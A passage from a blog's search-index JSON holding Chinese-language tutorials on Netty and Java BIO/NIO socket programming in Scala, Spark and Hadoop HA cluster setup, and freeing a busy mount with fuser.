Unpooled.copiedBuffer((back+\"$*\").getBytes(\"UTF-8\")) ctx.writeAndFlush(resp) &#125; def getCurrentTime(): String =&#123; val format = new SimpleDateFormat(\"YYYY-MM-dd HH:mm:ss.SSS\") format.format(new Date) &#125; override def exceptionCaught(ctx: ChannelHandlerContext, cause: Throwable): Unit = &#123; println(\"server exception close\") ctx.close() &#125;&#125; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import io.netty.bootstrap.Bootstrapimport io.netty.buffer.Unpooledimport io.netty.channel.nio.NioEventLoopGroupimport io.netty.channel.socket.SocketChannelimport io.netty.channel.socket.nio.NioSocketChannelimport io.netty.channel.&#123;ChannelInitializer, ChannelOption&#125;import io.netty.handler.codec.DelimiterBasedFrameDecoderimport io.netty.handler.codec.string.StringDecoderimport io.netty.handler.logging.&#123;LogLevel, LoggingHandler&#125;/** * @author xwolf * @since 1.8 **/class DelimiterClient &#123; def connect(host:String,port:Int):Unit=&#123; val work = new NioEventLoopGroup() val bootstrap = new Bootstrap() try &#123; //定义分隔符 val delimiter = Unpooled.copiedBuffer(\"$*\".getBytes()) bootstrap.group(work).channel(classOf[NioSocketChannel]). option(ChannelOption.TCP_NODELAY.asInstanceOf[ChannelOption[Any]],true).handler(new ChannelInitializer[SocketChannel] &#123; override def initChannel(ch: SocketChannel) =&#123; ch.pipeline().addLast(new DelimiterBasedFrameDecoder(1024,delimiter)) ch.pipeline().addLast(new StringDecoder()) ch.pipeline().addLast(new LoggingHandler(LogLevel.DEBUG)) ch.pipeline().addLast(new DelimiterClientHandler) &#125; &#125;) val funture = bootstrap.connect(host, port).sync() funture.channel().closeFuture().sync() &#125; finally&#123; work.shutdownGracefully() &#125; &#125;&#125;object DelimiterClient&#123; def main(args: Array[String]): Unit = &#123; val client = new DelimiterClient client.connect(\"localhost\",9091) &#125;&#125; 1234567891011121314151617181920212223242526272829303132333435363738import io.netty.buffer.Unpooledimport io.netty.channel.&#123;ChannelHandlerContext, ChannelInboundHandlerAdapter&#125;/** * @author xwolf * @since 1.8 **/class DelimiterClientHandler extends ChannelInboundHandlerAdapter&#123; override def channelActive(ctx: ChannelHandlerContext): Unit = &#123; println(\"client channelActive\") var message:String = null for (i &lt;-0 to 50)&#123; if ( i % 2 == 0 )&#123; message = \"EXIT\" &#125; else &#123; message=\"client发送到服务端信息:\" &#125; val finalMsg =message+i+\"$*\" val writeBuf =Unpooled.buffer(finalMsg.length()) writeBuf.writeBytes(finalMsg.getBytes()) ctx.writeAndFlush(writeBuf) &#125; &#125; override def channelRead(ctx: ChannelHandlerContext, msg: scala.Any): Unit = &#123; println(\"client channelRead\") val message = msg.asInstanceOf[String] println(message) &#125; override def channelReadComplete(ctx: ChannelHandlerContext): Unit = &#123; println(\"client channeReadComplete\") ctx.flush() &#125;&#125; 基于自定义分隔符实现消息编码。 参考资料 《TCP/IP详解 卷一:协议》 《Netty权威指南》 Netty官网拆包、粘包 Netty系列之Netty编解码框架分析","updated":"2020-07-19T00:23:27.812Z","tags":[{"name":"netty","slug":"netty","permalink":"http://xwolf191.github.io/tags/netty/"}]},{"title":"Netty基础入门","date":"2017-11-01T06:35:00.000Z","path":"2017/11/01/distributed/Netty基础入门/","text":"一、为什么选择Netty NIO面临的问题: 1. 由于JAVA NIO类库和API的繁杂,需要熟练掌握Selector,ServerSocketChannel,ByteBuffer等。2. 客户端面临断线重连、网络闪断、半包读写等问题，要写出高可用的NIO比较困难。3. JDK NIO selector空轮询bug(摘自####),具体内容参考 Java epoll空轮询bug到底是怎样造成的? 选择netty的理由: API简单,方便开发出高性能、高可靠的网络通信应用而且社区活跃,广泛应用于互联网各行业。 二、Netty入门例子 添加netty依赖 12345&lt;dependency&gt; &lt;groupId&gt;io.netty&lt;/groupId&gt; &lt;artifactId&gt;netty-all&lt;/artifactId&gt; &lt;version&gt;4.1.16.Final&lt;/version&gt;&lt;/dependency&gt; 2.1 服务端开发 12345678910111213141516171819202122232425262728293031323334353637import io.netty.bootstrap.ServerBootstrapimport io.netty.channel.ChannelInitializerimport io.netty.channel.nio.NioEventLoopGroupimport io.netty.channel.socket.SocketChannelimport io.netty.channel.socket.nio.NioServerSocketChannelclass Server &#123; def bind(host:String,port:Int):Unit=&#123; //服务端接收客户端请求 val bossGroup = new NioEventLoopGroup() // 处理socketChannel网络读写请求 val workerGroup = new NioEventLoopGroup() try &#123; //服务启动辅助 val serverBootstrap = new ServerBootstrap() //添加I/O 事件处理, serverBootstrap.group(bossGroup, workerGroup) .channel(classOf[NioServerSocketChannel]).childHandler(new ChannelInitializer[SocketChannel] &#123; override def initChannel(ch: SocketChannel) = ch.pipeline().addLast(new ServerHandler) &#125;) //绑定端口,等待绑定完成 val futureChannel = serverBootstrap.bind(host, port).sync() futureChannel.channel().closeFuture().sync() &#125; finally&#123; //优雅关机 bossGroup.shutdownGracefully() workerGroup.shutdownGracefully() &#125; &#125;&#125;object Server&#123; def main(args: Array[String]): Unit = &#123; val server = new Server server.bind(\"localhost\",9090) &#125;&#125; NioEventLoopGroup 是用来处理I/O操作的多线程事件循环器，Netty提供了许多不同的EventLoopGroup的实现用来处理不同传输协议。在这个例子中我们实现了一个服务端的应用，因此会有2个NioEventLoopGroup会被使用。第一个经常被叫做‘boss’，用来接收进来的连接。第二个经常被叫做‘worker’，用来处理已经被接收的连接，一旦‘boss’接收到连接，就会把连接信息注册到‘worker’上。如何知道多少个线程已经被使用，如何映射到已经创建的Channels上都需要依赖于EventLoopGroup的实现，并且可以通过构造函数来配置他们的关系。 ServerBootstrap 是一个启动NIO服务的辅助启动类。你可以在这个服务中直接使用Channel，但是这会是一个复杂的处理过程，在很多情况下你并不需要这样做。 123456789101112131415161718192021222324252627import io.netty.buffer.&#123;ByteBuf, Unpooled&#125;import io.netty.channel.&#123;ChannelHandlerContext, ChannelInboundHandlerAdapter&#125;class ServerHandler() extends ChannelInboundHandlerAdapter&#123; override def channelActive(ctx: ChannelHandlerContext): Unit = println(\"server: channelActive\") override def channelReadComplete(ctx: ChannelHandlerContext) = println(\"server channelReadComplete\") override def channelRead(ctx: ChannelHandlerContext, msg: scala.Any): Unit = &#123; println(\"server channelRead invoked\") val byteBuf = msg.asInstanceOf[ByteBuf] val bytes = new Array[Byte](byteBuf.readableBytes()) byteBuf.readBytes(bytes) val message = new String(bytes, \"UTF-8\") println(message) val back = \"good boy!\" val resp = Unpooled.copiedBuffer(back.getBytes(\"UTF-8\")) println(msg) ctx.writeAndFlush(resp) &#125; override def exceptionCaught(ctx: ChannelHandlerContext, cause: Throwable): Unit = &#123; println(\"server exception close\") ctx.close() &#125;&#125; 2.2 客户端开发 123456789101112131415161718192021222324252627282930mport io.netty.bootstrap.Bootstrapimport io.netty.channel.ChannelInitializerimport io.netty.channel.nio.NioEventLoopGroupimport io.netty.channel.socket.SocketChannelimport io.netty.channel.socket.nio.NioSocketChannelclass Client &#123; def connect(host:String,port:Int):Unit=&#123; val work = new NioEventLoopGroup() val bootstrap = new Bootstrap() try &#123; bootstrap.group(work).channel(classOf[NioSocketChannel]).handler(new ChannelInitializer[SocketChannel] &#123; override def initChannel(ch: SocketChannel) = ch.pipeline().addLast(new ClientHandler()) &#125;) val funture = bootstrap.connect(host, port).sync() funture.channel().closeFuture().sync() &#125; finally&#123; work.shutdownGracefully() &#125; &#125;&#125;object Client&#123; def main(args: Array[String]): Unit = &#123; def client = new Client client.connect(\"localhost\",9090) &#125;&#125; 12345678910111213141516171819202122232425import io.netty.buffer.&#123;ByteBuf, Unpooled&#125;import io.netty.channel.&#123;ChannelHandlerContext, ChannelInboundHandlerAdapter&#125;class ClientHandler extends ChannelInboundHandlerAdapter&#123; override def channelActive(ctx: ChannelHandlerContext): Unit = &#123; println(\"client channelActive\") val content = \"hello server\" ctx.writeAndFlush(Unpooled.copiedBuffer(content.getBytes(\"UTF-8\"))) &#125; override def channelRead(ctx: ChannelHandlerContext, msg: scala.Any): Unit = &#123; println(\"client channelRead\") val byteBuf = msg.asInstanceOf[ByteBuf] val bytes = new Array[Byte](byteBuf.readableBytes()) byteBuf.readBytes(bytes) val message = new String(bytes, \"UTF-8\") println(message) &#125; override def channelReadComplete(ctx: ChannelHandlerContext): Unit = &#123; println(\"client channeReadComplete\") ctx.flush() &#125;&#125; 先做一个简单的入门例子,具体的API后期再深入源码看一下。 参考资料 《Unix网络编程》","updated":"2020-07-19T00:23:27.812Z","tags":[{"name":"netty","slug":"netty","permalink":"http://xwolf191.github.io/tags/netty/"}]},{"title":"Scala/Java IO（BIO/NIO）","date":"2017-10-29T01:05:00.000Z","path":"2017/10/29/大数据/Scala(Java) IO(BIO&NIO)/","text":"一、Unix IO 模型前言 阻塞IO (Blocking IO) 非阻塞IO (Non-Blocking IO) 复用IO (Multiplexing IO) 信号驱动IO 异步IO (Asynchronous IO) 1.1 阻塞IO 同步阻塞 IO 模型是最常用的一个模型，也是最简单的模型。在Unix中，缺省情况下所有的文件操作都是阻塞的。它符合人们最常见的思考逻辑。阻塞就是进程 “被” 休息, CPU处理其它进程去了。 在这个IO模型中，用户空间的应用程序执行一个系统调用（recvform），这会导致应用程序阻塞，什么也不干，直到数据准备好，并且将数据从内核复制到用户进程，最后进程再处理数据，在等待数据到处理数据的两个阶段，整个进程都被阻塞。不能处理别的网络IO。调用应用程序处于一种不再消费 CPU 而只是简单等待响应的状态，因此从处理的角度来看，这是非常有效的。在调用recv()/recvfrom()函数时，发生在内核中等待数据和复制数据的过程，大致如下图： 1.2 非阻塞IO 在这种模型中，设备是以非阻塞的形式打开的。这意味着 IO 操作不会立即完成，read 操作可能会返回一个错误代码，说明这个命令不能立即满足（EAGAIN 或 EWOULDBLOCK）。 在网络IO时候，非阻塞IO也会进行recvform系统调用，检查数据是否准备好，与阻塞IO不一样，”非阻塞将大的整片时间的阻塞分成N多的小的阻塞, 所以进程不断地有机会 ‘被’ CPU光顾”。 也就是说非阻塞的recvform系统调用调用之后，进程并没有被阻塞，内核马上返回给进程，如果数据还没准备好，此时会返回一个error。进程在返回之后，可以干点别的事情，然后再发起recvform系统调用。重复上面的过程，循环往复的进行recvform系统调用。这个过程通常被称之为轮询。轮询检查内核数据，直到数据准备好，再拷贝数据到进程，进行数据处理。需要注意，拷贝数据整个过程，进程仍然是属于阻塞的状态。 1.3 多路复用IO 由于同步非阻塞方式需要不断主动轮询，轮询占据了很大一部分过程，轮询会消耗大量的CPU时间，而 “后台” 可能有多个任务在同时进行，人们就想到了循环查询多个任务的完成状态，只要有任何一个任务完成，就去处理它。如果轮询不是进程的用户态，而是有人帮忙就好了。那么这就是所谓的 “IO 多路复用”。UNIX/Linux 下的 select、poll、epoll 就是干这个的（epoll 比 poll、select 效率高，做的事情是一样的）。 IO多路复用有两个特别的系统调用select、poll、epoll函数。select调用是内核级别的，select轮询相对非阻塞的轮询的区别在于—-前者可以等待多个socket，能实现同时对多个IO端口进行监听，当其中任何一个socket的数据准好了，就能返回进行可读，然后进程再进行recvform系统调用，将数据由内核拷贝到用户进程，当然这个过程是阻塞的。select或poll调用之后，会阻塞进程，与blocking IO阻塞不同在于，此时的select不是等到socket数据全部到达再处理, 而是有了一部分数据就会调用用户进程来处理。如何知道有一部分数据到达了呢？监视的事情交给了内核，内核负责数据到达的处理。也可以理解为”非阻塞”吧。 I/O复用模型会用到select、poll、epoll函数，这几个函数也会使进程阻塞，但是和阻塞I/O所不同的的，这两个函数可以同时阻塞多个I/O操作。而且可以同时对多个读操作，多个写操作的I/O函数进行检测，直到有数据可读或可写时（注意不是全部数据可读或可写），才真正调用I/O操作函数。 1.4 信号驱动IO 信号驱动IO，不是异步IO。信号驱动IO是指：进程预先告知内核，使得 当某个socketfd有events（事件）发生时，内核使用信号通知相关进程。异步IO（Asynchronous IO）是指：进程执行IO系统调用（read / write）告知内核启动某个IO操作，内核启动IO操作后立即返回到进程。IO操作即内核当中的服务例程。Posix 通过 aio_XXX函数提供真正的异步IO（参见 man 7 aio). 1.5 异步IO 在计算机科学中，异步I / O或“非顺序I / O”是输入/输出处理的一种形式，允许其他处理在传输完成之前继续。与数据处理相比，计算机上的输入和输出（I / O）操作可能非常慢。I / O设备可以结合必须物理移动的机械设备，例如寻求磁道读取或写入的硬盘驱动器; 这通常比电流切换慢几个数量级。例如，在执行10毫秒的磁盘操作期间，以一千兆赫兹计时的处理器可能已经执行了1000万条指令处理周期。I / O的简单方法是启动访问，然后等待它完成。但是，这种方法（称为同步阻塞I / O）会在通信进行中阻止程序的进展，从而使系统资源闲置。当程序进行许多I / O操作（例如主要或很大程度上取决于用户输入的程序）时，这意味着处理器几乎可以花费几乎所有的时间空闲等待I / O操作完成。或者，可以开始通信，然后执行不要求I / O完成的处理。这种方法称为异步输入/输出。依赖I / O完成的任务（包括使用输入值和关键操作来声明确保写操作已经完成）仍然需要等待I / O操作完成，因此是仍然被阻塞，但是不能依赖于I / O操作的其他处理可以继续。存在许多操作系统功能以在多个层次上实现异步I / O。事实上，除了最基本的操作系统之外，除了最基本的异步I / O之外，其中一个主要功能是执行至少某种形式的基本异步I / O，尽管这对于操作员或程序员来说可能不是特别明显。在最简单的软件解决方案中，会间隔轮询硬件设备状态，以检测设备是否准备好进行下一个操作。（例如，CP / M操作系统是这样构建的，它的系统调用语义不需要比这更复杂的I / O结构，尽管大多数实现更复杂，从而更有效）直接内存访问（DMA）可以大大提高基于轮询的系统的效率，并且硬件中断可以完全消除轮询的需要。多任务操作系统可以利用硬件中断提供的功能，同时隐藏用户中断处理的复杂性。假脱机是旨在利用异步I / O的多任务处理的第一种形式之一。最后，用户进程中的多线程和显式异步I / O API可以进一步利用异步I / O，代价是额外的软件复杂性。异步I / O用于提高吞吐量，延迟和/或响应能力。 二、Scala(java) IO2.1 BIO（socket为例）server123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263import java.net.&#123;InetSocketAddress, ServerSocket&#125;class BioServer &#123; def bind(host:String,port:Int):Unit=&#123; val serverSocket = new ServerSocket() val socketAddress = new InetSocketAddress(host,port) serverSocket.bind(socketAddress) while (true) &#123; val socket = serverSocket.accept() new BioServerHandler(socket).start() &#125; &#125;&#125;object BioServer&#123; def main(args: Array[String]): Unit = &#123; val server = new BioServer server.bind(\"localhost\",9543) &#125;&#125;//serverHandlerimport java.io.&#123;BufferedReader, InputStreamReader, PrintWriter&#125;import java.net.Socketimport scala.util.control.Breaksclass BioServerHandler(val socket:Socket) extends Thread&#123; override def run() = &#123; var bufferedReader:BufferedReader = null var printWriter:PrintWriter = null try&#123; bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream)) printWriter = new PrintWriter(socket.getOutputStream,true) val content:StringBuilder= new StringBuilder val loop = new Breaks loop.breakable &#123; while (true) &#123; val readLine = bufferedReader.readLine() println(s\"server获取的内容:$readLine\") if (\"EXIT\".equalsIgnoreCase(readLine) || readLine==null)&#123; loop.break() &#125; content.append(readLine) &#125; &#125; println(\"server接收的内容:\"+content.toString()) printWriter.println(\"已经收到客户端内容:\"+content.toString()) &#125;catch&#123; case ex :Exception =&gt; println(ex.getMessage) &#125;finally &#123; bufferedReader.close() printWriter.close() socket.close() &#125; &#125;&#125; client: 12345678910111213141516171819202122232425262728293031323334import java.io.&#123;BufferedReader, InputStreamReader, PrintWriter&#125;import java.net.Socketclass BioClient &#123; def connect(host:String,port:Int):Unit=&#123; val socket = new Socket(host,port) var bufferedReader:BufferedReader = null var printWriter:PrintWriter = null try&#123; bufferedReader = new BufferedReader(new InputStreamReader(socket.getInputStream)) printWriter = new PrintWriter(socket.getOutputStream,true) printWriter.println(\"client 发送：socket通信测试\") printWriter.println(\"EXIT\") val content = bufferedReader.readLine(); println(s\"server接收的内容:$content\") &#125;catch&#123; case ex :Exception =&gt; println(ex.getMessage) &#125;finally &#123; bufferedReader.close() printWriter.close() socket.close() &#125; &#125;&#125;object BioClient&#123; def main(args: Array[String]): Unit = &#123; val client = new BioClient client.connect(\"localhost\",9543) &#125;&#125; 2.2 伪异步IO 使用线程池来实现伪异步IO通信,上述阻塞IO改造一下. server端改造一下，其他不变。 123456789101112131415161718192021222324import java.net.&#123;InetSocketAddress, ServerSocket&#125;import java.util.concurrent.Executorsclass BioServer &#123; def bind(host:String,port:Int):Unit=&#123; val serverSocket = new ServerSocket() val socketAddress = new InetSocketAddress(host,port) serverSocket.bind(socketAddress) //线程池 val executors = Executors.newFixedThreadPool(10) while (true) &#123; val socket = serverSocket.accept() executors.submit(new BioServerHandler(socket)) &#125; &#125;&#125;object BioServer&#123; def main(args: Array[String]): Unit = &#123; val server = new BioServer server.bind(\"localhost\",9543) &#125;&#125; 2.3 NIO NIO主要有三大核心部分：Channel(通道)，Buffer(缓冲区), Selector。传统IO基于字节流和字符流进行操作，而NIO基于Channel和Buffer(缓冲区)进行操作，数据总是从通道读取到缓冲区中，或者从缓冲区写入到通道中。Selector(选择区)用于监听多个通道的事件（比如：连接打开，数据到达）。因此，单个线程可以监听多个数据通道。 NIO和传统IO（一下简称IO）之间第一个最大的区别是，IO是面向流的，NIO是面向缓冲区的。 Java IO面向流意味着每次从流中读一个或多个字节，直至读取所有字节，它们没有被缓存在任何地方。此外，它不能前后移动流中的数据。如果需要前后移动从流中读取的数据，需要先将它缓存到一个缓冲区。NIO的缓冲导向方法略有不同。数据读取到一个它稍后处理的缓冲区，需要时可在缓冲区中前后移动。这就增加了处理过程中的灵活性。但是，还需要检查是否该缓冲区中包含所有您需要处理的数据。而且，需确保当更多的数据读入缓冲区时，不要覆盖缓冲区里尚未处理的数据。 IO的各种流是阻塞的。这意味着，当一个线程调用read() 或 write()时，该线程被阻塞，直到有一些数据被读取，或数据完全写入。该线程在此期间不能再干任何事情了。 NIO的非阻塞模式，使一个线程从某通道发送请求读取数据，但是它仅能得到目前可用的数据，如果目前没有数据可用时，就什么都不会获取。而不是保持线程阻塞，所以直至数据变的可以读取之前，该线程可以继续做其他的事情。 非阻塞写也是如此。一个线程请求写入一些数据到某通道，但不需要等待它完全写入，这个线程同时可以去做别的事情。 线程通常将非阻塞IO的空闲时间用于在其它通道上执行IO操作，所以一个单独的线程现在可以管理多个输入和输出通道（channel）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170import java.net.InetSocketAddressimport java.nio.ByteBufferimport java.nio.channels.&#123;SelectionKey, Selector, ServerSocketChannel, SocketChannel&#125;class NIOServer &#123; def bind(host: String, port: Int): Unit = &#123; //创建 val selector = Selector.open() val serverSocketChannel = ServerSocketChannel.open() val address = new InetSocketAddress(host, port) serverSocketChannel.configureBlocking(false) //绑定指定端口 serverSocketChannel.socket().bind(address) //注册多路复用器,监听ACCEPT事件 serverSocketChannel.register(selector, SelectionKey.OP_ACCEPT, ByteBuffer.allocate(1024)) while (true) &#123; selector.select(1000) val keys = selector.selectedKeys().iterator() while (keys.hasNext) &#123; val key = keys.next keys.remove if (key.isValid)&#123; //链接状态 if (key.isConnectable) &#123; println(\"server 连接..\") &#125; // accept 操作,处理新接入的操作 if (key.isAcceptable) &#123; println(\"server 接收新请求\") val serverSocketChannel:ServerSocketChannel = key.channel().asInstanceOf[ServerSocketChannel] val socketChannel = serverSocketChannel.accept() //设置为非阻塞模式 socketChannel.configureBlocking(false) //注册到多路复用器上,监听读操作，读取客户端发送的内容 socketChannel.register(selector,SelectionKey.OP_READ) &#125; //可读 if (key.isReadable) &#123; val socketChannel = key.channel().asInstanceOf[SocketChannel] val bytebuf = ByteBuffer.allocate(1024) val read = socketChannel.read(bytebuf) read match &#123; case x if (x==0) =&gt; println(\"server 读取完成\") case x if (x&gt;0) =&gt; &#123; println(\"server 读取内容\") bytebuf.flip() val byteAry =new Array[Byte](bytebuf.remaining()) //从缓冲区读取内容 bytebuf.get(byteAry) val content = new String(byteAry,\"UTF-8\") println(s\"server读取到的内容:$content\") val readContent = \"server读取到内容:\"+content val writeBuf = ByteBuffer.allocate(1024) writeBuf.put(readContent.getBytes()) writeBuf.flip() //向缓冲区写入内容,发送到客户端 socketChannel.write(writeBuf) &#125; case x if (x&lt;0) =&gt; &#123; println(\"server 链路关闭\") &#125; &#125; &#125; //可写 if (key.isWritable) &#123; println(s\"可写....\") &#125; &#125; &#125; &#125; &#125;&#125;object NIOServer &#123; def main(args: Array[String]): Unit = &#123; val server =new NIOServer server.bind(\"localhost\",9090) &#125;&#125;//Clientclass NIOClient &#123; @volatile var STOP = true def connect(host:String,port:Int):Unit=&#123; //初始化多路复用器 val selector = Selector.open() val socketChannel = SocketChannel.open() socketChannel.configureBlocking(false) val connect = socketChannel.connect(new InetSocketAddress(host,port)) if (connect)&#123; socketChannel.register(selector,SelectionKey.OP_READ) println(s\"client 连接情况,$connect\") //处理写操作 write(socketChannel) &#125; else &#123; //注册连接 socketChannel.register(selector,SelectionKey.OP_CONNECT) &#125; while (STOP)&#123; selector.select(2000) val keys = selector.selectedKeys.iterator while (keys.hasNext)&#123; val key = keys.next keys.remove() if (key.isValid)&#123; val socketChannel = key.channel().asInstanceOf[SocketChannel] if ( key.isConnectable )&#123; println(\"连接状态..\") if (socketChannel.finishConnect())&#123; socketChannel.register(selector,SelectionKey.OP_READ) //处理操作 write(socketChannel) &#125; else &#123; System.exit(1) &#125; &#125; if (key.isReadable)&#123; val byteBuf = ByteBuffer.allocate(1024) val read = socketChannel.read(byteBuf) read match &#123; case x if (x==0) =&gt; println(\"无可读内容\") case x if (x&gt;0) =&gt; &#123; println(\"可读\") byteBuf.flip() val readAry = new Array[Byte](byteBuf.remaining()) byteBuf.get(readAry) val content = new String(readAry,\"UTF-8\") println(s\"client 读取的内容:$content\") //读取server内容后退出 STOP = false &#125; case x if (x&lt;0) =&gt; &#123; println(\"链路关闭\") key.cancel() socketChannel.close() &#125; &#125; &#125; &#125; &#125; &#125; &#125; def write(socketChannel:SocketChannel):Unit=&#123; val content = \"socket通信测试内容\" val byteBuf = ByteBuffer.allocate(1024) byteBuf.put(content.getBytes) byteBuf.flip() socketChannel.write(byteBuf) if ( ! byteBuf.hasRemaining )&#123; println(s\"client内容写入成功:$content\") &#125; &#125;&#125;object NIOClient&#123; def main(args: Array[String]): Unit = &#123; val client =new NIOClient client.connect(\"localhost\",9090) &#125;&#125; 参考资料 《Unix网络编程》 聊聊Linux 五种IO模型 漫谈linux文件IO New I/O java ) Asynchronous_I/O 攻破JAVA NIO技术壁垒","updated":"2020-07-19T00:23:27.963Z","tags":[{"name":"netty","slug":"netty","permalink":"http://xwolf191.github.io/tags/netty/"}]},{"title":"Spark环境搭建","date":"2017-10-26T12:35:00.000Z","path":"2017/10/26/大数据/Spark 环境搭建/","text":"准备 JDK(1.8) Scala(2.12) Spark(2.2) 一、Spark环境配置1.1 配置 spark-env.sh 12345#JAVA homeJAVA_HOME=/usr/share/java#指定hadoop配置文件HADOOP_CONF_HOME=/opt/hadoop/hadoop-2.7.4/etc/hadoop slaves 123hadoop03hadoop04hadoop05 1.2 启动 12#启动所有/opt/hadoop/spark-2.2.0/sbin/start-all.sh 访问web界面：http://127.0.0.1:8080 1.3 spark shell 12#进入spark-shell/opt/hadoop/spark-2.2.0/bin/spark-shell 执行简单脚本： 123456789#从本地磁盘读取文件scala&gt; val f = sc.textFile(\"file:/root/zookeeper.out\")f: org.apache.spark.rdd.RDD[String] = file:/root/zookeeper.out MapPartitionsRDD[5] at textFile at &lt;console&gt;:24#执行wordcount 输出scala&gt; f.flatMap(_.split(\" \")).map(w =&gt; (w,1)).reduceByKey(_+_).collect()res3: Array[(String, Int)] = Array((environment:os.arch=amd64,1), (20:23:34,719,1), (20:23:35,726,3), ([QuorumPeer[myid=1]/0:0:0:0:0:0:0:0:2181:QuorumPeer@844],1), (attempting,2), (2017-10-26,91), ((message,4), (3200,1), (snapshot,1), (20:23:51,239,10), (Got,1), (20:23:51,209,1), (20:23:35,725,1), (environment:user.home=/root,1), (hadoop02,9), (20:23:38,135,1), ([QuorumPeer[myid=1]/0:0:0:0:0:0:0:0:2181:FastLeaderElection@852],6), (session,4), (20:23:51,257,1), (environment:os.name=Linux,1), (from:,1), ([main:FileSnap@83],1), (TOOK,1), (WARN,16), ([QuorumPeer[myid=1]/0:0:0:0:0:0:0:0:2181:Follower@116],1), (connection,5), (Corporation,1), (task,1), (20:23:51,214,1), ([SyncThread:1:FileTxnLog@203],1), (Accepted,2), (the,1), (quorum,1), (address:,19), (0.0.0.0/0.0.0.0:2181,1), (Creating,1),...scala&gt;","updated":"2020-07-19T00:23:27.964Z","tags":[{"name":"spark","slug":"spark","permalink":"http://xwolf191.github.io/tags/spark/"}]},{"title":"Linux unmount device is busy(转)","date":"2017-10-25T05:30:00.000Z","path":"2017/10/25/linux/linux unmount  device is busy/","text":"当任何目录有 mount, 然后有程序使用/挂在那个目录上的话, 就没有办法 umount 掉, 於 umount 时会出现 Device is busy 的讯息.要怎麼找出是哪个程序挂在那个目录上? 然后去把那个程式砍掉呢?使用 fuser 的指令那要怎麼找出是哪个程式挂在那个目录上？可以使用 fuser - identify processes using files or sockets假设现在 mount 起来的目录是 /media/share 查询: 1fuser -m /media/share 显示: /media/share: 25023c就代表是 process 25023(pid) 有使用到此目录, 后面 c 代表的意思可参考下述: c: current directory. e: executable being run. f: open file. f is omitted in default display mode. F: open file for writing. F is omitted in default display mode. r: root directory. m: mmap’ed file or shared library.要把这个资源释放的话, 可以有下述做法:kill -9 25023 # ps aux | grep 25023 #应该就会看到它 fuser -m -v -i -k /media/share # 会问你是不是要把 25023 这个 kill 掉, 选 y 就会 kill 掉 提示信息如下: USER PID ACCESS COMMAND /meida/share: root 25023 ..c.. bash Kill process 25023 ? (y/N) y 转自:linux umount 时出现device is busy 的处理方法","updated":"2020-07-19T00:23:27.881Z","tags":[{"name":"linux","slug":"linux","permalink":"http://xwolf191.github.io/tags/linux/"}]},{"title":"Hadoop HA 环境搭建","date":"2017-10-25T02:11:00.000Z","path":"2017/10/25/大数据/Hadoop HA 搭建/","text":"准备工作 JDK(1.8),下载 zookeeper(3.4.9),下载 Hadoop (2.7.4),下载 一、节点布局 IP 节点信息 hadoop01 ZK、nameNode、resourceManager hadoop02 ZK、nameNode、resourceManager hadoop03 ZK、 dataNode、nodeManager hadoop04 dataNode、nodeManager hadoop05 dataNode、nodeManager 二、Zookeeper 搭建 2.1 JDK安装及环境变量 忽略 2.2 Linux免密登录2.2.1 主机名或者IP映射 1vim /etc/hosts/ 添加IP和主机名的映射关系后保存 127.0.0.1 localhost ::1 localhost 172.16.253.129 mysql 172.16.253.158 hadoop01 172.16.253.159 hadoop02 172.16.253.160 hadoop03 172.16.253.161 hadoop04 172.16.253.162 hadoop05 其他服务器上执行相同操作. 2.2.2 免密登录 在Hadoop01上生成rsa秘钥, 12ssh-keygen -t rsa 12345678910111213141516171819分发公钥到目标机器ssh-copy-id -i /root/.ssh/id_rsa.pub 用户名@对方机器IP (注意不要忘记了参数-i)注：ssh-copy-id -i 是最简单的办法，如果不用这个，就得分下面二个步骤:#将公钥复制到其他服务器上scp /root/.ssh/id_rsa.pub 用户名@IP:/root/.ssh/#公钥内容保存到authorized_keyscat /root/.ssh/id_rsa.pub &gt;&gt; authorized_keys# ssh 主机名,直接登录成功,表示免密登录配置成功ssh hadoop05 2.3 ZK集群搭建 123456#创建zookeeper data 目录mkdir -p /opt/datas/zookeeper/#创建myid文件touch /opt/datas/zookeeper/myid#标记当前服务的ID,不同的服务器此处不一样echo 1 &gt;&gt; /opt/datas/zookeeper/myid 配置zoo.cfg 12345678910#数据目录dataDir=/opt/datas/zookeeper#日志目录dataLogDir=/opt/hadoop/zookeeper-3.4.9/logs/#端口clientPort=2181#集群信息server.1=hadoop01:2888:3888server.2=hadoop02:2888:3888server.3=hadoop03:2888:3888 将zookeeper 分发到其他要配置的服务器指定目录中,防火墙做好策略 12345#启动zk/opt/hadoop/zookeeper/zkServer.sh start#查看状态,正常则显示leader或follower/opt/hadoop/zookeeper/zkServer.sh status 三、Hadoop 集群搭建 3.1 Hadoop 配置 hadoop-env.sh,Hadoop 环境配置 12#明确java路径export JAVA_HOME=/usr/java/jdk_1_8 core-site.xml,hadoop 核心配置 12345678910111213141516171819&lt;configuration&gt; &lt;property&gt; &lt;name&gt;fs.defaultFS&lt;/name&gt; &lt;value&gt;hdfs://hn1&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;hadoop.tmp.dir&lt;/name&gt; &lt;value&gt;file:/opt/datas/hadoop/tmp&lt;/value&gt; &lt;/property&gt; &lt;!--HA zookeeper--&gt; &lt;property&gt; &lt;name&gt;ha.zookeeper.quorum&lt;/name&gt; &lt;value&gt;hadoop01:2181,hadoop02:2181,hadoop03:2181&lt;/value&gt; &lt;/property&gt;&lt;/configuration&gt; hdfs-site.xml,HDFS配置 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798&lt;configuration&gt; &lt;property&gt; &lt;name&gt;dfs.replication&lt;/name&gt; &lt;value&gt;2&lt;/value&gt; &lt;/property&gt; &lt;property&gt; &lt;name&gt;dfs.webhdfs.enabled&lt;/name&gt; &lt;value&gt;true&lt;/value&gt; &lt;/property&gt;&lt;!--datanode 目录--&gt; &lt;property&gt; &lt;name&gt;dfs.datanode.data.dir&lt;/name&gt; &lt;value&gt;file:/opt/datas/hadoop/dfs/data&lt;/value&gt; &lt;/property&gt; &lt;!--namenode--&gt; &lt;property&gt; &lt;name&gt;dfs.namenode.name.dir&lt;/name&gt; &lt;value&gt;file:/opt/datas/hadoop/dfs/name&lt;/value&gt; &lt;/property&gt; 